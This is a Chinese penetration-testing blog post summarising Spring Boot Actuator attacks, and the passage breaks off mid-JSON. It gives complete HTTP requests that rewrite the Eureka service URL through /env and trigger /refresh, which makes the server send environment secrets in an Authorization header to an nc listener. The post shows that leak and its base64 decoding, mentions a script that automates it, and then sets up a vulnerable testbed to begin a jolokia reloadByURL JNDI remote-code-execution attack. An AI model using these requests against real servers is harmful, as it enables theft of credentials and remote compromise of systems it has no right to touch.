---
title: SpringBoot Actuator RCE 漏洞总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17167757.html
source: 博客园 - 渗透测试中心
date: 2023-03-02
fetch_date: 2025-10-04T08:27:01.138324
---

# SpringBoot Actuator RCE 漏洞总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [SpringBoot Actuator RCE 漏洞总结](https://www.cnblogs.com/backlion/p/17167757.html "发布于 2023-03-01 12:32")

### 一、SpringBoot env 获取\* 敏感信息

当我们直接访问 springboot 站点时,可以看到某些 password 字段填充了\*

1. 通过${name} 可以获取明文字段

2. 配置不当导致敏感信息泄露(password 打星号,而 pwd 没有打星号) [![](https://github.com/jas502n/SpringBoot_Actuator_RCE/raw/master/pwd.png)](https://github.com/jas502n/SpringBoot_Actuator_RCE/blob/master/pwd.png)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123203473-1048483928.jpg)

参考 <https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA>

具体实现过程:

例如: 我们要获取 pid 参数值

```
"PID": "10648",
```

```
POST /env HTTP/1.1
Host: 10.20.24.191:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

eureka.client.serviceUrl.defaultZone=http://${PID}@10.20.24.191:2444/
```

然后 post refresh 任意内容,触发漏洞

Ps: 一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少spring-boot-starter-actuator扩展包无法刷新漏洞则无法利用

```
POST /refresh HTTP/1.1
Host: 10.20.24.191:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

12312
```

当服务器 nc 监听端口2444 时,接收到

```
root@kali:/tmp# nc -lvvp 2444
listening on [any] 2444 ...
connect to [10.20.24.191] from kali [10.20.24.191] 40960
GET /xstream/apps/ HTTP/1.1
Accept: application/json
DiscoveryIdentity-Name: DefaultClient
DiscoveryIdentity-Version: 1.4
DiscoveryIdentity-Id: 10.20.24.191
Accept-Encoding: gzip
Host: 10.20.24.191:2444
Connection: Keep-Alive
User-Agent: Java-EurekaClient/v1.4.11
Authorization: Basic MzgzNDY6bnVsbA==
```

Authorization: Basic MzgzNDY6bnVsbA==

base64 解码得到

```
root@kali:/tmp# echo MzgzNDY6bnVsbA== |base64 -d
38346:null
```

和上面的 pid 信息一样

同样 获取 user.country参数,步骤也一样

结果:

```
root@kali:/tmp# nc -lvvp 2555
listening on [any] 2555 ...
connect to [10.20.24.191] from kali [10.20.24.191] 38994
GET /xstream/apps/ HTTP/1.1
Accept: application/json
DiscoveryIdentity-Name: DefaultClient
DiscoveryIdentity-Version: 1.4
DiscoveryIdentity-Id: 10.20.24.191
Accept-Encoding: gzip
Host: 10.20.24.191:2555
Connection: Keep-Alive
User-Agent: Java-EurekaClient/v1.4.11
Authorization: Basic VVM6bnVsbA==

 sent 0, rcvd 310
```

base64 解码得到

```
root@kali:/tmp# echo VVM6bnVsbA== |base64 -d
US:null
```

```
脚本化：
```

输入要查询的参数,输入 nc 监听的端口 [![](https://github.com/jas502n/SpringBoot_Actuator_RCE/raw/master/send_env.png)](https://github.com/jas502n/SpringBoot_Actuator_RCE/blob/master/send_env.png)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123204371-1348724531.jpg)

监听端口,获取指定 header 头,自动 base64 解密 [![](https://github.com/jas502n/SpringBoot_Actuator_RCE/raw/master/password.png)](https://github.com/jas502n/SpringBoot_Actuator_RCE/blob/master/password.png)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123205136-1093949527.jpg)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123206021-825774621.jpg)

Ps: 如果您很幸运在目标类路径中具有Eureka-Client <1.8.7（通常包含在Spring Cloud Netflix中），则可以利用其中的XStream反序列化漏洞。

例如: User-Agent: Java-EurekaClient/v1.4.11

### 二、SpringBoot\_Actuator JNDI RCE

#### 1. 环境搭建

git clone https://github.com/veracode-research/actuator-testbed

启动

```
mvn install
或
mvn spring-boot:run
```

通过编译运行,发现监听IP 地址为 127.0.0.1,只能本机访问 百度查找,修改为 0.0.0.0 就好了

查找关键文件

grep -r 'server.address' -n ./

```
./src/main/resources/application.properties:2:server.address=127.0.0.1
./target/classes/application.properties:2:server.address=127.0.0.1
```

改为

```
server.port=8090
server.address=0.0.0.0

# vulnerable configuration set 0: spring boot 1.0 - 1.4
# all spring boot versions 1.0 - 1.4 expose actuators by default without any parameters
# no configuration required to expose them

# safe configuration set 0: spring boot 1.0 - 1.4
#management.security.enabled=true

# vulnerable configuration set 1: spring boot 1.5+
# spring boot 1.5+ requires management.security.enabled=false to expose sensitive actuators
#management.security.enabled=false

# safe configuration set 1: spring boot 1.5+
# when 'management.security.enabled=false' but all sensitive actuators explicitly disabled
#management.security.enabled=false

# vulnerable configuration set 2: spring boot 2+
#management.endpoints.web.exposure.include=*
```

#### 2.重启启动

mvn spring-boot:run

或

```
/opt/jdk1.8.0_60//bin/java -classpath /opt/apache-maven-3.6.2/boot/plexus-classworlds-2.6.0.jar -Dclassworlds.conf=/opt/apache-maven-3.6.2/bin/m2.conf -Dmaven.home=/opt/apache-maven-3.6.2 -Dlibrary.jansi.path=/opt/apache-maven-3.6.2/lib/jansi-native -Dmaven.multiModuleProjectDirectory=/root/actuator/actuator-testbed org.codehaus.plexus.classworlds.launcher.Launcher spring-boot:run
```

稍等片刻

```
root@kali:~/actuator/actuator-testbed# netstat -ntpl |grep 8090
tcp6       0      0 :::8090                 :::*                    LISTEN      33666/java
root@kali:~/actuator/actuator-testbed#
```

<http://10.20.24.191:8090/> [![](https://github.com/jas502n/SpringBoot_Actuator_RCE/raw/master/spring.png)](https://github.com/jas502n/SpringBoot_Actuator_RCE/blob/master/spring.png)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123206803-2050467207.png)

<http://10.20.24.191:8090/jolokia/list> [![](https://github.com/jas502n/SpringBoot_Actuator_RCE/raw/master/reloadByURL.png)](https://github.com/jas502n/SpringBoot_Actuator_RCE/blob/master/reloadByURL.png)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230301123207520-1178629798.png)

中 reloadByURL 可以加载远程 url xml 文件

```
"ch.qos.logback.classic": {
"Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator": {
"op": {
"reloadByURL": {
"args":...